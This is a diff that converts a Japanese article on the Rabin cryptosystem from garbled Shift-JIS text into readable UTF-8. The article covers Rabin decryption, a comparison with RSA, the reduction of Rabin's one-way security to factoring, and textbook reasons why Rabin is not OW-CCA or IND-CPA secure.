-���Í��ł̈Í����ŗp���錮���A���J���Í��ŒʐM�҂̊Ԃɂ����ċ��L����Ƃ�
-���ꍇ�����肤��i������n�C�u���b�h�Í��j�B���̏ꍇ�́A���J���Í��̈�
-�����A���S���Y���ɓ��͂���镽���͌��i�Z�b�V�������j�Ȃ̂ŁA���̗�����
-�悤�Ȃ��̂Ȃ̂ŁA�Ӗ��̂��镶�͂��`������킯���Ȃ��B
-�@���ɍl��������@�Ƃ��ẮA�����ɓ���ȍ\�������邱�Ƃł���B�Ⴆ�΁A
-�Œ�̃t���O���܂ނ悤�ɂ�����A�����̍Ō��64�r�b�g�����̒��O��64�r�b�g
-�Ɠ����ɂ���Ȃǂł���B�������A���̕��@��Rabin�Í��̕����Ƃ��Ă��܂��ƁA
-�m���Ɉ�Ӑ��̖��͉�������邪�A�f����������Ɠ��l�����܂������Ȃ���
-��B�܂�A�f�������������ł����Ă��A���S�����ۏႳ��Ȃ��Ȃ��Ă���
-���Ƃ������Ƃł���B
-�@�ł��悢������́A��Ӑ��̖�����������Willams�Í����g�����Ƃł���BW
-illiams�Í��ɂ��Ă͎����WB�ŏЉ��\��ł���B
+1：sk=(p,q)、c=m^2を入力とする。
+
+2：x^2≡c (mod p)、x^2≡c (mod q)の平方根を求める。ここでは計算結果をx≡
+±a (mod p)、x≡±b (mod q)とおく。
+
+3：M1=[a,b]、M2=[a,-b]、M3=[-a,b]、M4=[-a,-b]を計算する。
+
+4：M1〜M4のいずれかを出力する。
+
+●補足
+
+　以上で定義した3つのKeyGen,Enc,DecがRabin暗号の定義である。定義とは別と
+して、補足したいことがある。
+
+　KeyGenのステップ1におけるセキュリティパラメータとは、ビット長を決めるも
+のである。kではなく、1^kを入力とする理由については、各アルゴリズムはチュ
+ーリングマシンと呼ばれるモデルで考えていることに大きく関係する。ここでは
+チューリングマシンについては紹介しないため、KeyGenの入力は単にビット長（
+2進数の世界の桁数）を意味していると認識してもらえればよい。
+　KeyGenのステップ2において、p,qは単に大きな素数とのみ指定している。本に
+よっては、もっと制限された素数を用いている場合もある。ここでは最も基本的
+なRabin暗号の紹介をしたいため、シンプルな素数の選び方にした。
+　KeyGenのステップ4におけるpkは公開鍵、skは秘密鍵である。
+
+　Encのステップ1におけるmは平文、ステップ3におけるcは暗号文である。つまり、
+公開鍵pkと平文mで暗号文cを計算していることがわかる。
+
+　Decのステップ2において、2つの合同方程式の平方根を求める必要がある。素数
+を法とした場合は効率的に平方根が計算可能であることが知られているので、こ
+れは効率的に計算可能である。
+　Decのステップ3における4つの計算は、それぞれに対してCRTを適用させればよ
+い。
+　Decのステップ4において平文がM1〜M4のように4つ計算される。M1〜M4のいずれ
+かが妥当な平文mであるが、妥当な平文に絞り込むためには別の仕組みの助けが必
+要とされる。その仕組みに関する考察はは後述する。
 
 
-��0x05.) Rabin�Í��̈��S��
+■0x04.) Rabin暗号 vs. RSA暗号
 
-��OW-CPA���S
+　WB34において（教科書的）RSA暗号を紹介した。ここではRabin暗号とRSA暗号を
+比較してみる。
 
-�@OW-CPA�U���҂�Rabin�Í����������ƂƁA�f������������������Ƃ͓��l�ł�
-�邪�m���Ă���B�܂�ARabin�Í��͑f������������̉���OW-CPA���S�ł���B
-���̎������A���@�ŏؖ�����B
+●アルゴリズム
 
-[�藝]OW-CPA�U���҂�Rabin�Í����������ƂƁA�f������������������Ƃ͓��l
-�ł���B
+　復習になるが教科書的RSA暗号の暗号文はm^e (mod N)であった。一方、Rabin暗
+号の暗号文はm^2 (mod N)である。これだけの比較によれば、Rabin暗号はe=2の場
+合のRSA暗号と思える。しかし、そうではない。なぜならば、KeyGenに注目しても
+らえばよい。教科書的RSA暗号のKeyGenにおいて、「GCD((p-1)(q-1),e)=1」を満
+たすeを生成している。つまり、常に「GCD((p-1)(q-1),e)=1」が成り立っている
+ということである。p,qは素数なので、奇数である。
+　よって、p-1,q-1はどちらも偶数である。(p-1)(q-1)も偶数になることを踏まえ
+ると、e=2のときに「GCD(e,(p-1)(q-1))=1」は成り立たない。ゆえに、Rabin暗号
+は教科書的RSA暗号の特殊ケースというわけでもないことがわかる。
+　そして、Rabin暗号のDecでは2次合同式である「c≡m^2 (mod N)」（N=pq）は4
+つの解が計算される。しかし、「GCD(e,(p-1)(q-1))≠1」であるために4つから1
+つに絞り込めないのである。
 
-[�ؖ�]�܂�A��N��c���畽���̌��m�������I�ɏo�͂���A����OW��j��i�Í���
-c���畽��m�����S�ɋ��߂�j�A���S���Y���Ƃ���BB��N�������I�ɑf����������
-��A���S���Y���Ƃ���B
+●安全性
 
-[1]B�����݂����A�����݂���
+　教科書的RSA暗号は、RSA仮定の下でOW-CPA安全である。OW-CPAという表記につ
+いてはWB40を参照して欲しい。
+　一方、Rabin暗号は、大きな桁の合成数の場合は素因数分解が困難であるとい
+う仮定（以降、素因数分解困難仮定と呼ぶことにする）の下でOW-CPA安全である。
+Rabin暗号（1979年）はRSA暗号（1977年）の提案後に発表されたが、実は安全性
+証明が付いた初の公開鍵暗号である。
 
-�@B�̗͂𗘗p����A���\�����邱�Ƃ��ł���΂悢�B
-�@A��N,c�����͂����B������B�ɑ΂���N��^����B�����B��p,q���o�͂����
-�ŁAA��p,q��m�邱�Ƃ��ł���Bp,q��m�邱�Ƃ��ł���΁ARabin�Í���Dec��
-�p�ł���̂ŁAc����m���o�͂ł���B
+　RSA暗号と素因数分解困難仮定を比較すると、後者の方が弱い仮定である。仮定
+は弱い方が嬉しいと、WB39で紹介した。つまり、Rabin暗号とRSA暗号は安全性の
+みでみるとOW-CPA安全と同じであり、仮定で見るとRabin暗号の方がより理想的と
+いえる。
 
-[2]A�����݂����B�����݂���
+●効率性
 
-�@A�̗͂𗘗p����B���\�����邱�Ƃ��ł���΂悢�B
-�@B��N�����͂����BB��Z_N�����l�����_����m'��I�����Ac=(m')^2 mod N��
-�v�Z����B�����āA������A�ɑ΂���N��c����͂���B����c��honest�ɈÍ�����
-������Ƃ��Ɠ��������ł��邽�߁AA��B�̓����ɑ��݂��邱�ƂɋC�Â��悤��
-�Ȃ��B����āAA��m���o�͂���B
-�@B��m��m�邱�Ƃ��ł��AGCD(m'-m,N)���v�Z���ďo�͂���B
+　教科書的RSA暗号のEncでは、m^eを計算する。つまり、mod nの世界における平
+方計算と乗算計算が必要とされる。この計算はWB35で紹介したべき乗計算のアル
+ゴリズムが利用される。これにより、単純に乗算するよりも効率的に計算できる。
+　一方、Rabin暗号のEncでは、m^2を計算する。つまり、mod nの世界における平
+方計算だけで済む。
+　よって、暗号化に関しては、Rabin暗号の方が高速と言える。
 
-�@m'=[a,b]�Ƃ���ƁAc=(m')^2 mod N=[a^2,b^2]�ɂȂ�BA���o�͂���m��c�̕���
-����1�Ȃ̂ŁAm�͎���4��m1�`m4�̂����ꂩ�ɂȂ��Ă���B
+　教科書的RSA暗号のDecでは、c^dを計算する。つまり、mod nの世界における平
+方計算と乗算計算が必要とされる。
+　一方、Rabin暗号のDecでは、x^2≡c (mod p)、x^2≡c (mod q)の平方根、そし
+てCRTの計算が必要である。
 
-�Em1=[a,b]
-�Em2=[-a,b]
-�Em3=[a,-b]
-�Em4=[-a,-b]
+　ところで、KeyGenで生成されるp,qを単純に大きな素数とするのではなく、p,q
+を法4の世界で3になる素数（Blum数を構成するp,q）にすると、復号が早くなると
+いう。
 
-(i)m=m1=[a,b]�̂Ƃ��Am'-m1=[a,b]-[a,b]=[0,0]�����߂�B
-�@�܂�Am'-m1��0 mod p����m'-m1��0 mod q�𖞂���m'-m mod N�����߂�B
-�@p,q�͑f���Ȃ̂ŁA���炩�Ɍ݂��ɑf�ł���ACRT�ɂ��m'-m mod N�����߂邱
-�Ƃ��ł���B
+●特徴
 
-�@���������CRT�̐����Ŏg�����L�����ꎞ�I�Ɏg�����Ƃɒ��ӁB
+　Rabin暗号は一意性の問題が存在する。暗号文であるc mod nを復号すると、4つ
+の平方根が求まり、その4つのうちの1つが正しい平文mになる。正しい平文を特定
+するにはいくつかの方法が存在する。
+　平文を特定する最も素朴な方法は、復号して得られた4つの値の内容を読み取り、
+正しい文章を選ぶという方法である。しかし、正しい文章であるかを自動的に識
+別するというのは一般には難しい。しかも、確実性がない。それだけではなく、
+平文そのものは言語として意味を成すとは限らない。例えば、公開鍵暗号を共通
+鍵暗号での暗号化で用いる鍵を、公開鍵暗号で通信者の間において共有するとい
+う場合もありうる（いわゆるハイブリッド暗号）。この場合は、公開鍵暗号の暗
+号化アルゴリズムに入力される平文は鍵（セッション鍵）なので、一種の乱数の
+ようなものなので、意味のある文章を形成するわけがない。
+　次に考えられる方法としては、平文に特殊な構造を入れることである。例えば、
+固定のフラグを含むようにしたり、平文の最後の64ビットをその直前の64ビット
+と同じにするなどである。しかし、この方法をRabin暗号の平文としてしまうと、
+確かに一意性の問題は解決されるが、素因数分解問題と同値性がまったくなくな
+る。つまり、素因数分解困難仮定であっても、安全性が保障されなくなってしま
+うということである。
+　最もよい解決策は、一意性の問題を解決したWillams暗号を使うことである。W
+illiams暗号については次回のWBで紹介する予定である。
+
+
+■0x05.) Rabin暗号の安全性
+
+●OW-CPA安全
+
+　OW-CPA攻撃者がRabin暗号を解くことと、素因数分解問題を解くことは同値であ
+るが知られている。つまり、Rabin暗号は素因数分解仮定の下でOW-CPA安全である。
+この事実を帰着法で証明する。
+
+[定理]OW-CPA攻撃者がRabin暗号を解くことと、素因数分解問題を解くことは同値
+である。
+
+[証明]まずAをNとcから平文の候補mを効率的に出力する、即ちOWを破る（暗号文
+cから平文mを完全に求める）アルゴリズムとする。BをNを効率的に素因数分解す
+るアルゴリズムとする。
+
+[1]Bが存在する⇒Aが存在する
+
+　Bの力を利用してAを構成することができればよい。
+　AはN,cが入力される。内部のBに対してNを与える。するとBはp,qを出力するの
+で、Aはp,qを知ることができる。p,qを知ることができれば、Rabin暗号のDecを利
+用できるので、cからmを出力できる。
+
+[2]Aが存在する⇒Bが存在する
+
+　Aの力を利用してBを構成することができればよい。
+　BはNが入力される。BはZ_Nから一様ランダムにm'を選択し、c=(m')^2 mod Nを
+計算する。そして、内部のAに対してNとcを入力する。このcはhonestに暗号文を
+作ったときと同じ作り方であるため、AはBの内部に存在することに気づきようが
+ない。よって、Aはmを出力する。
+　Bはmを知ることができ、GCD(m'-m,N)を計算して出力する。
+
+　m'=[a,b]とすると、c=(m')^2 mod N=[a^2,b^2]になる。Aが出力するmはcの平文
+候補の1つなので、mは次の4つのm1〜m4のいずれかになっている。
+
+・m1=[a,b]
+・m2=[-a,b]
+・m3=[a,-b]
+・m4=[-a,-b]
+
+(i)m=m1=[a,b]のとき、m'-m1=[a,b]-[a,b]=[0,0]を求める。
+　つまり、m'-m1≡0 mod pかつm'-m1≡0 mod qを満たすm'-m mod Nを求める。
+　p,qは素数なので、明らかに互いに素であり、CRTによりm'-m mod Nを求めるこ
+とができる。
+
+　ここからはCRTの説明で使った記号を一時的に使うことに注意。
 
 M=m1m2
 
 M1=M/m1=m2=q
 M2=M/m2=m1=p
 
-y1=(M1)^(-1) mod m1=q^(-1) mod p�@��q^(-1)�͌v�Z�����ɂ��̂܂܂Ŗ��Ȃ��B
+y1=(M1)^(-1) mod m1=q^(-1) mod p　←q^(-1)は計算せずにこのままで問題なし。
 y2=(M2)^(-1) mod m2=p^(-1) mod q
 
-x=a1�EM1�Ey1+a2�EM2�Ey2 mod M
+x=a1・M1・y1+a2・M2・y2 mod M
 
-�@�ȏ�ŏ������ł����B�����藝�̏ؖ����Ŏg���Ă���L���ɒu��������Ǝ�
-�̂悤�ɂȂ�B
+　以上で準備ができた。これを定理の証明内で使っている記号に置き換えると次
+のようになる。
 
-m'-m1=0�Eq�Eq^(-1)+0�Ep�Ep^(-1) mod N=0+0=0
-m'-m1=Nr (��r��Z)
+m'-m1=0・q・q^(-1)+0・p・p^(-1) mod N=0+0=0
+m'-m1=Nr (∀r∈Z)
 
-�@����āAGCD(m'-m,N)=GCD(Nr,N)=N
+　よって、GCD(m'-m,N)=GCD(Nr,N)=N
 
-(ii)m=m2=[-a,b]�̂Ƃ��Am'-m=[a,b]-[-a,b]=[2a,0]�����߂�B
-�@�܂�Am'-m��2a mod p����m'-m��0 mod q�𖞂���m'-m mod N�����߂�B(i)
-�Ɠ��l��CRT���g���ċ��߂�Ǝ��̂悤�ɂȂ�B
+(ii)m=m2=[-a,b]のとき、m'-m=[a,b]-[-a,b]=[2a,0]を求める。
+　つまり、m'-m≡2a mod pかつm'-m≡0 mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
 
-m'-m2=2a�Eq�Eq^(-1)+0�Ep�Ep^(-1) mod N=2a�Eq�Eq^(-1)
+m'-m2=2a・q・q^(-1)+0・p・p^(-1) mod N=2a・q・q^(-1)
 
-�@����āAGCD(m'-m,N)=GCD(2a�Eq�Eq^(-1),pq)=q
+　よって、GCD(m'-m,N)=GCD(2a・q・q^(-1),pq)=q
 
-(iii)m=m3=[a,-b]�̂Ƃ��Am'-m=[a,b]-[a,-b]=[0,2b]�����߂�B
-�@�܂�Am'-m��0 mod p����m'-m��2b mod q�𖞂���m'-m mod N�����߂�B(i)
-�Ɠ��l��CRT���g���ċ��߂�Ǝ��̂悤�ɂȂ�B
+(iii)m=m3=[a,-b]のとき、m'-m=[a,b]-[a,-b]=[0,2b]を求める。
+　つまり、m'-m≡0 mod pかつm'-m≡2b mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
 
-m'-m3=0�Eq�Eq^(-1)+2b�Ep�Ep^(-1) mod N=2b�Ep�Ep^(-1)
+m'-m3=0・q・q^(-1)+2b・p・p^(-1) mod N=2b・p・p^(-1)
 
-�@����āAGCD(m'-m,N)=GCD(2b�Ep�Ep^(-1),pq)=p
+　よって、GCD(m'-m,N)=GCD(2b・p・p^(-1),pq)=p
 
-(iv)m=m4=[-a,-b]�̂Ƃ��Am'-m=[a,b]-[-a,-b]=[2a,2b]�����߂�B
-�@�܂�Am'-m��2a mod p����m'-m��2b mod q�𖞂���m'-m mod N�����߂�B(i)
-�Ɠ��l��CRT���g���ċ��߂�Ǝ��̂悤�ɂȂ�B
+(iv)m=m4=[-a,-b]のとき、m'-m=[a,b]-[-a,-b]=[2a,2b]を求める。
+　つまり、m'-m≡2a mod pかつm'-m≡2b mod qを満たすm'-m mod Nを求める。(i)
+と同様にCRTを使って求めると次のようになる。
 
-m'-m4=2a�Eq�Eq^(-1)+2b�Ep�Ep^(-1) mod N
+m'-m4=2a・q・q^(-1)+2b・p・p^(-1) mod N
 
-�@����āAGCD(m'-m,N)=GCD(2a�Eq�Eq^(-1)+2b�Ep�Ep^(-1),pq)=1
+　よって、GCD(m'-m,N)=GCD(2a・q・q^(-1)+2b・p・p^(-1),pq)=1
 
-�@�ȏ��(i)�`(iv)���܂Ƃ߂�Ǝ��̌��ʂɂȂ����B
+　以上の(i)〜(iv)をまとめると次の結果になった。
 
 -----------------------
 | m'-m  | GCD(m'-m,N) |
@@ -2238,278 +2238,278 @@ m'-m4=2a�Eq�Eq^(-1)+2b�Ep�Ep^(-1) mod N
 | m'-m4 | 1           |
 -----------------------
 
-�@����āAA��m��m1�`m4�����ꂼ��1/4�ŏo�͂���Ƃ��AB���f���������ɐ�����
-��iB�̏o�͂�p�����q�ɂȂ�j�m���́AA�̐����m����4����1�ɂȂ�B
+　よって、Aがmをm1〜m4をそれぞれ1/4で出力するとき、Bが素因数分解に成功す
+る（Bの出力がpありはqになる）確率は、Aの成功確率の4分の1になる。
 
-�@���������āAA,B�̐����m�������ꂼ��Adv(A),Adv(B)�ƕ\�L����ƁA
+　したがって、A,Bの成功確率をそれぞれAdv(A),Adv(B)と表記すると、
 
 Adv(B)=Adv(A)/4
 
-�����藧�B
+が成り立つ。
 
-�@�܂�AB��4�񒆂�1��͑f���������ɐ������邱�ƂɂȂ�A�\���傫�Ȋm����
-����B�����ł����c�_��1/4�̊m���Ő�������B�̋�̓I�ȍ\���ł������B������
-������A����ɂ��܂�B�̋�̓I�ȍ\�������邩������Ȃ��̂ŁA��ʂɂ�Adv(B)
-��Adv(A)/4�Ƃ������ƂɂȂ�B���ۂɂ��ꂪ���������Ƃ��������߂ɁA��̓I��
-�ʂ�B�̍\���@���Љ�悤�B
+　つまり、Bが4回中に1回は素因数分解に成功することになり、十分大きな確率で
+ある。ここでした議論は1/4の確率で成功するBの具体的な構成であった。もしか
+したら、さらにうまいBの具体的な構成があるかもしれないので、一般にはAdv(B)
+≧Adv(A)/4ということになる。実際にこれが正しいことを示すために、具体的に
+別のBの構成法を紹介しよう。
 
-[�ʏ�]���ǔł�B�̍\���@
+[別証]改良版のBの構成法
 
-�@A�̗͂𗘗p����B���\�����邱�Ƃ��ł���΂悢�B
-�@B��N�����͂����BB��Z_N�����l�����_����m'��I������B�I������m'��GCD
-(m',N)=1�𖞂������ǂ������m�F����B����GCD(m',N)��1�Ȃ�΁Am'��p��q��
-�ĂĂ��܂�����Ԃł���B���̂Ƃ���m'���o�͂���Αf�����ɂȂ��Ă���B����A
-����GCD(m',N)=1�Ȃ�΁A���̑���ɐi�ށB
-�Ac=(m')^2 mod N���v�Z����B�����āA������A�ɑ΂���N��c����͂���B����c
-�͎d�l�ʂ�ɈÍ�����������Ƃ��Ɠ��������ł��邽�߁AA��B�̓����ɑ��݂�
-�邱�ƂɋC�t���悤���Ȃ��B����āAA��m���o�͂���B
-�@B��m��m�邱�Ƃ��ł��Am��m'���邢��-m' mod N�ł���΁A������xc����蒼
-����A���N���������B�����A���o�͂���m��m'���邢��-m' mod N�łȂ��l�ɂȂ�
-�܂ŌJ��Ԃ��BB��m'���邢��-m' mod N�łȂ��l�𓾂邱�Ƃ��ł�����AGCD(m'
--m,N)���v�Z���ďo�͂���B
+　Aの力を利用してBを構成することができればよい。
+　BはNが入力される。BはZ_Nから一様ランダムにm'を選択する。選択したm'がGCD
+(m',N)=1を満たすかどうかを確認する。もしGCD(m',N)≠1ならば、m'はpかqを当
+ててしまった状態である。このときはm'を出力すれば素因数になっている。一方、
+もしGCD(m',N)=1ならば、次の操作に進む。
+、c=(m')^2 mod Nを計算する。そして、内部のAに対してNとcを入力する。このc
+は仕様通りに暗号文を作ったときと同じ作り方であるため、AはBの内部に存在す
+ることに気付きようがない。よって、Aはmを出力する。
+　Bはmを知ることができ、mがm'あるいは-m' mod Nであれば、もう一度cを作り直
+してAを起動し直す。これをAが出力するmがm'あるいは-m' mod Nでない値になる
+まで繰り返す。Bがm'あるいは-m' mod Nでない値を得ることができたら、GCD(m'
+-m,N)を計算して出力する。
 
-�@�ȏ�ŉ��ǔł�B�̍\���͊����ł���B��{�͂����قǂ�B�̍\���Ɠ����ł���B
-�@B��m'��I���������_�ŁAGCD(m',N)��1�����藧�Ă΁Am'=p,q�̂����ꂩ�̂Ƃ�
-�ł���i���̂Ƃ��̏󋵂�Event�ƌĂԂ��Ƃɂ���j�B����āAB��m'�����̂܂�
-�o�͂���Αf���������ɐ�������B�������A���̊m���͊m���͖����ł���قǏ�
-�����B
-�@A�̏o��m��m1�`m4�̂����ꂩ�ł������B���̂���m=m1,m4�̂Ƃ��͏]����B�͑f
-�����������������ƂɎ��s���Ă���B�����ŁA���ǔł�B��A�̏o�͂�m=m1�܂���
-m4�ł��������_�ŁA�܂��V����A��m�̐��������肢����̂ł���B���s�̓x��A��
-�N�����������߁A������m2���邢��m3���o�͂��邱�Ƃ����҂ł���B
-�@�����̒��ӓ_���l�����āA���ǔł�B�̐����m����]�����Ă݂�B�����ł�A
-�ւ̖₢���킹�񐔂�k�Ƃ���i�Z�L�����e�B�p�����[�^�Ŏg����k�Ƃ͕ʕ��Ȃ�
-�Œ��Ӂj�B
+　以上で改良版のBの構成は完了である。基本はさきほどのBの構成と同じである。
+　Bがm'を選択した時点で、GCD(m',N)≠1が成り立てば、m'=p,qのいずれかのとき
+である（このときの状況をEventと呼ぶことにする）。よって、Bはm'をそのまま
+出力すれば素因数分解に成功する。しかし、その確率は確率は無視できるほど小
+さい。
+　Aの出力mはm1〜m4のいずれかであった。そのうちm=m1,m4のときは従来のBは素
+因数分解を解くことに失敗している。そこで、改良版のBはAの出力がm=m1または
+m4であった時点で、また新しくAにmの生成をお願いするのである。失敗の度にAを
+起動し直すため、いつかはm2あるいはm3を出力することを期待できる。
+　これらの注意点を考慮して、改良版のBの成功確率を評価してみる。ここではA
+への問い合わせ回数をkとする（セキュリティパラメータで使ったkとは別物なの
+で注意）。
 
 Adv(B) = Adv(A)(1-(1/2)^k) + Pr[Event]
 
-�@Pr[Event]=2/N�ł���A�����ł���قǏ������B
+　Pr[Event]=2/Nであり、無視できるほど小さい。
 
-�@���������āA����B�̐����m���Ƃ��čl���Ă悢�B
+　したがって、次がBの成功確率として考えてよい。
 
 Adv(B) = Adv(A)(1-(1/2)^k)
 
-�@k=1�̂Ƃ���A��1�񂾂��N������Ƃ��ł���A���̂Ƃ���1/2�̊m���ł����f��
-���������������A�]����B�Ɠ��������m���ɂȂ��Ă���B
-�@k�̐���������Α�����قǁA(1/2)^k�͏������Ȃ�̂ŁA1-(1/2)^k�͑傫����
-��AAdv(A)(1-(1/2)^k)���傫���Ȃ邱�Ƃ��킩��B
+　k=1のときはAを1回だけ起動するときであり、このときは1/2の確率でしか素因
+数分解が解けず、従来のBと同じ成功確率になっている。
+　kの数が増えれば増えるほど、(1/2)^kは小さくなるので、1-(1/2)^kは大きくな
+り、Adv(A)(1-(1/2)^k)も大きくなることがわかる。
 
-�@Rabin�Í����f������������̉���OW-CPA���S�ł��邱�Ƃ������ꂽ���Ƃ��ؖ�
-�ł����B���ɒm�肽���̂�OW-CPA���S�����������S���������ǂ����Ƃ����_
-�ł���BOW-CPA���S�ɋ߂����S���Ƃ��āAOW-CCA���S��SS-CPA���S�iIND-CPA���S
-�Ɠ����Ȃ̂ŁA�Ȍ��IND-CPA���S�ōl����j�ł��邱�Ƃ�WB40�̌��J���Í��̈�
-�S���̕\���킩��B
-�@���ʂ���q�ׂ�ƁARabin�Í���OW-CCA���S�EIND-CPA���S�łȂ����Ƃ��m���
-�Ă���B���̂��Ƃ𒼊ϓI�ɍl���Ă݂悤�B
+　Rabin暗号が素因数分解仮定の下でOW-CPA安全であることが示されたことが証明
+できた。次に知りたいのはOW-CPA安全よりも強い安全性を持つかどうかという点
+である。OW-CPA安全に近い安全性として、OW-CCA安全とSS-CPA安全（IND-CPA安全
+と等価なので、以後はIND-CPA安全で考える）であることはWB40の公開鍵暗号の安
+全性の表よりわかる。
+　結果から述べると、Rabin暗号はOW-CCA安全・IND-CPA安全でないことが知られ
+ている。このことを直観的に考えてみよう。
 
-��OW-CCA���S�łȂ�
+●OW-CCA安全でない
 
-�@OW-CCA���S��j��U���҂͈Í����I���N���𗘗p���邱�Ƃ��ł��A���J���ƃ^
-�[�Q�b�g�Í������^����ꂽ�Ƃ��ɁA�^�[�Q�b�g�Í����̕��������߂邱�Ƃ���
-�W�ł���B
+　OW-CCA安全を破る攻撃者は暗号化オラクルを利用することができ、公開鍵とタ
+ーゲット暗号文が与えられたときに、ターゲット暗号文の平文を求めることが目
+標である。
 
-�@�U����A�ɂ�pk=N�A�^�[�Q�b�g�Í���c^*(=(m^*)^2 mod N)�����͂����B
-�@Z_N�ォ���l�����_����m'��I�����āAc'=(m')^2 mod N���v�Z����B����c'
-�𕜍��I���N��DO�ɑ��M����B����ƕ����I���N����c�̕������Ƃ���m~��A��
-�ԐM����B
-�@A��GCD(m~-m',N)���v�Z���邱�ƂŁA�m��1/2��N�̑f�������m��ł���B�܂�A
-A�͊m��1/2��p,q��m�邱�Ƃ��ł���B
-�@p,q��m�邱�Ƃ��ł���΁A�閧����m���Ă��邱�ƂƓ��l�ł���ADec�A���S
-���Y�����g���ĈÍ������畽�������o�����Ƃ��ł��肤�B�������ADec�A���S��
-�Y�����g���Ă�1/4�ł����Ó���m^*�����o���Ȃ��B
-�@�䂦�ɁA���̂悤�ɍ\������A��1/8�̊m����OW��j���Ă��邱�ƂɂȂ�B1/8��
-�m���͏\���傫�����߁ARabin�Í���OW-CCA���S�ł͂Ȃ��B
+　攻撃者Aにはpk=N、ターゲット暗号文c^*(=(m^*)^2 mod N)が入力される。
+　Z_N上から一様ランダムにm'を選択して、c'=(m')^2 mod Nを計算する。このc'
+を復号オラクルDOに送信する。すると復号オラクルはcの平文候補としてm~をAに
+返信する。
+　AはGCD(m~-m',N)を計算することで、確率1/2でNの素因数を確定できる。つまり、
+Aは確率1/2でp,qを知ることができる。
+　p,qを知ることができれば、秘密鍵を知っていることと同値であり、Decアルゴ
+リズムを使って暗号文から平文を取り出すことがでｋりう。ただし、Decアルゴリ
+ズムを使っても1/4でしか妥当なm^*を取り出せない。
+　ゆえに、このように構成したAは1/8の確率でOWを破っていることになる。1/8の
+確率は十分大きいため、Rabin暗号はOW-CCA安全ではない。
 
-�@���łɕʂ̍U����A�̍\�����Љ��B
-�@�U����A�ɂ�pk=N�A�^�[�Q�b�g�Í���c^*(=(m^*)^2 mod N)�����͂����B
-�@2^2��c^*�Ɋ|���Z���āA���̌v�Z���ʂ�c'�Ƃ��ĕ����I���N���ɑ��M����i��
-���I���N���ɂ̓^�[�Q�b�g�Í����𑗐M���Ă͂Ȃ�Ȃ�����A���܂��׍H������
-����j�Bc'=(2^2)�~(c^*)=(2m^*)^2�����藧���߁A�����I���N���̕ԐM��1/4��
-�m����2m^*�ł���B
-�@A��2m^*��2�Ŋ���΁Am^*�ɂȂ蕽�������o�����Ƃ��ł���B
-�@�䂦�ɁA���̂悤�ɍ\������A��1/4�̊m����OW��j���Ă��邱�ƂɂȂ�B1/4��
-�m���͏\���傫�����߁ARabin�Í���OW-CCA���S�ł͂Ȃ��B
+　ついでに別の攻撃者Aの構成も紹介する。
+　攻撃者Aにはpk=N、ターゲット暗号文c^*(=(m^*)^2 mod N)が入力される。
+　2^2をc^*に掛け算して、その計算結果をc'として復号オラクルに送信する（復
+号オラクルにはターゲット暗号文を送信してはならないから、うまく細工をして
+いる）。c'=(2^2)×(c^*)=(2m^*)^2が成り立つため、復号オラクルの返信は1/4の
+確率で2m^*である。
+　Aは2m^*を2で割れば、m^*になり平文を取り出すことができる。
+　ゆえに、このように構成したAは1/4の確率でOWを破っていることになる。1/4の
+確率は十分大きいため、Rabin暗号はOW-CCA安全ではない。
 
-��IND-CPA���S�łȂ�
+●IND-CPA安全でない
 
-�@IND-CPA���S��j��U���҂͈Í����I���N���𗘗p���邱�Ƃ��ł��A�`�������W
-���[���I��b�𐄑����邱�Ƃ��ڕW�ł���B
+　IND-CPA安全を破る攻撃者は暗号化オラクルを利用することができ、チャレンジ
+ャーが選んだbを推測することが目標である。
 
-�@�U����A�ɂ�N�����͂����B
-�@Z_N�ォ���l�����_����m0,m1��I�����āA(m0,m1)���`�������W���[�ɑ��M��
-��B�����1�r�b�g��b�������_���ɑI�����āA�Í���c=Enc(m_b)���v�Z����B��
-��c�̓`�������W���[����A�ɕԐM����Ă���B
-�@���ɁAm0,m1�����ꂼ��Í����I���N���ɑ��M����B����ƁAc0,c1��m�邱��
-���ł���B
-�@�����ŁAc=c0�����藧���ǂ������m�F����B�������藧�Ă�b=0�A���藧����
-�����b=1�ł��邱�Ƃ�100%�̊m���Ŏ��ʂł��Ă��܂��B�䂦�ɁARabin�Í���IN
-D-CPA���S�ł͂Ȃ��B
+　攻撃者AにはNが入力される。
+　Z_N上から一様ランダムにm0,m1を選択して、(m0,m1)をチャレンジャーに送信す
+る。すると1ビットのbをランダムに選択して、暗号文c=Enc(m_b)を計算する。そ
+のcはチャレンジャーからAに返信されてくる。
+　次に、m0,m1をそれぞれ暗号化オラクルに送信する。すると、c0,c1を知ること
+ができる。
+　そこで、c=c0が成り立つかどうかを確認する。もし成り立てばb=0、成り立たな
+ければb=1であることが100%の確率で識別できてしまう。ゆえに、Rabin暗号はIN
+D-CPA安全ではない。
 
-�@���͂��̂悤�ȋc�_��Rabin�Í��Ɍ��炸�A�m��I�Í��i�Í������ɓ����ŗ���
-���g���ĂȂ��Í��j�Ȃ�΂��ׂĂɂ����Č����邱�Ƃł���B���̂��߁ARabin��
-����RSA�Í���IND���S�ł��邱�Ƃ͂Ȃ��B
-
-
-��0x06.) �I����
-
-�@�����Rabin�Í����������̈�Ӑ��Ƃ����ۑ�����������Í��ɂ��ďЉ
-�����Ǝv���B����̋L���ɂ��Ă�����e�͌����ȋc�_�Ƃ������A���ϓI�ȋc�_
-�������B�������Ȃ���A���ϓI�ɑÓ��������o���Ȃ��ẮA�����ȋc�_���ł���
-�͂����Ȃ��B���̂��߁A����̋L���̂悤�Ɏ��s���늴���������ϓI�ȋc�_����
-�邱�Ƃ͖��ʂł͂Ȃ��Ǝv���B
-
-�@�ł́A�܂������ŉ�܂��傤�B
+　実はこのような議論はRabin暗号に限らず、確定的暗号（暗号化時に内部で乱数
+を使ってない暗号）ならばすべてにおいて言えることである。そのため、Rabin暗
+号もRSA暗号もIND安全であることはない。
 
 
+■0x06.) 終わりに
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+　次回はRabin暗号が持つ平文の一意性という課題を解決した暗号について紹介し
+たいと思う。今回の記事にしている内容は厳密な議論というより、直観的な議論
+が多い。しかしながら、直観的に妥当性が見出せなくては、厳密な議論ができる
+はずがない。そのため、今回の記事のように試行錯誤感が強い直観的な議論をす
+ることは無駄ではないと思う。
 
- --- ��7��: ���m�点 ---
+　では、また次号で会いましょう。
+
+
 
